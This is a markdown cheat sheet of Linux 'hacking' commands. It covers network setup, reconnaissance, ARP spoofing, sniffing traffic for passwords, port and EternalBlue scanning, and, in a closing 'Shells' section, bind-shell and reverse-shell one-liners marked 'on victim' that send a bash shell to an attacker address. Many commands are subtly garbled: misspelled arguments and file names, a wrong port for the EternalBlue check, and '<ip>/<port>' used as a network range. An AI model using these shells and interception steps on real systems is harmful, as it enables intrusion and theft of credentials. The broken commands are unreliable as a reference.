---
modified: 2025-01-09T22:47:17.906Z
title: Basic Linux Hacking Tools
---

## Basic Linux Networking Tools

#### Show IP Configuration

```bash
ip a l
```

#### Change IP Address Configuration

```bash
ip link set nev eth0 down
macchanger -m <mac-address> eth0
ip link set dev eth0 up
```

#### Static IP Address Configuration

```bash
ip addr add <mac-address> dev eth0
```

#### DNS Loopup

```bash
dig <url>
```

#### Reverse DNS Lookup

```bash
dig -x <ip>
```

## Information Gathering

#### Find Owner / Contact of Domain or IP Address

```bash
whois <url / ip-address>
```

#### Get Nameservers and test DNS for Zone Transfer

```bash
dig <url> ns
dig <url> axfr @n1.<url>
```

#### Get Hostnames from CT logs

https://crt.sh
%.<url>

#### Using an Nmap Script

```bash
nmap -sn -Pn <url> --script hostmap-crtsh
```

#### Combine Various Sources for Subdomain

```bash
amass enum -src -brute -min-for-recursive 2 -d <url>
```

## TCP Tools

#### Listen on TCP Port

```bash
ncat -l -p <port>
```

#### Connect to TCP Port

```bash
ncat <ip> <port>
```

## TLS Tools

#### Create Self-Signed Certificate

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.oem -nodes -subj "/CN=<url>/"
```

#### Start TLS Server

```bash
ncat --ssl -l -p <port>--ssl0cert cert.pem --ssl-key key.pem
```

#### Connect to TLS Service

```bash
ncat --ssl <ip> <port>
```

#### Connect to TLS Service Using openssl

```bash
openssl s_client -connect <ip><port>
```

#### Show Certificate Details

```bash
openssl s_client -connect <ip> | openssl x509 -text
```

#### Test TLS Server Certificate and Ciphers

```bash
sslyze --regular <ip>:<port>
```

#### TCP to TLS Proxy

```bash
socat TCP-LISTEN:<port>,fork,reuseaddr ssl:<url>:<port>
```

## HTTP Tools

#### Start Python Webserver on PORT <port>

```bash
python3 -m http.server 2305
```

#### Perform HTTP Request

```bash
curl http://<ip / url>
```

#### Scan for Common Files / Applications / Configs

```bash
nikto -host <url>
```

#### Enumerate Connon Directory / Filenames

```bash
gobuster -u <url> -w <dir>
```

## Sniffing

#### Arp Spoofing

```bash
arpspoof -t <ip-1><ip-2>
```

#### Graphical Tool

```bash
ettercap -G
```

#### Show ARP Cache

```bash
ip neigh
```

#### Delete API Cache

```bash
ip neigh flush all
```

#### Sniff Traffic

```bash
tcpdump [options] [filters]
```

#### Sniffing Over SSH on Remote Host

```bash
ssh <ip> tcpdump -w- port not ssh | wireshark -k -i -
```

#### Search in Network Traffic

```bash
ngrep -i password
```

#### Show HTTP GET Requests

```bash
urlsnarf
```

#### Show Transmitted Images

```bash
driftnet
```

## Network Scanning

#### ARP Scan

```bash
nmap -n -sn -PR <ip>/<port>
```

#### Reverse DNS Lookup of IP Range

```bash
nmap -sL <ip>/<port>
```

#### Nmap Host Discovery (API, ICMP, SYN 443.tcp, ACK 80/tcp)

```bash
nmap -sh -n <ip>/<port>
```

#### TCP Scan (SYN scan = half-open scan)

```bash
nmap -Pn -n -sS -p 22,25,80,443,8080 <ip>/<port>
```

#### List Nmap Scripts

```bash
ls /usr/share/nmap/scripts
```

#### Scan for EternalBlue vulnerable hosts

```bash
nmap -n -Pn -p 443 --script smb-vuln-ms17-010 <ip>/<port>
```

#### Scan for vulnerabilities

```bash
nmap -n -Pn --script "vuln and safe" <ip>/<port>
```

#### Performance Testing (1 SYN packet = 60 bytes -> 20'000 packets/s = 10Mbps)

```bash
nmap -n -Pn --min-rate 20000 <ip>/<port>
```

#### Fast Scan Using Masscan

```bash
masscan -p80,8000:8100 --rate 20000 <ip>/<port>
```

## Shells

#### Start Bind Shell

```bash
ncat -l -p 2305 -e "/bin/bash -i"
```

#### Connect to Bind Shell (on attacker)

```bash
ncat <ip> <port>
```

#### Listen for Reverse Shell (on attacker)

```bash
ncap -l -p <port>
```

#### Start Reverse Shell (on victim)

```bash
ncat -e "/bin/bash -i" <ip> <port>
```

#### Start Reverse Shell with Bash Only (on victim)

```bash
bash -i &>/dev/tcp/<ip>/<port> 0>&1
```

#### Upgrade to psuedo terminal

```bash
python -c 'import ptv';
pty.spawn("/bin/bash")
```
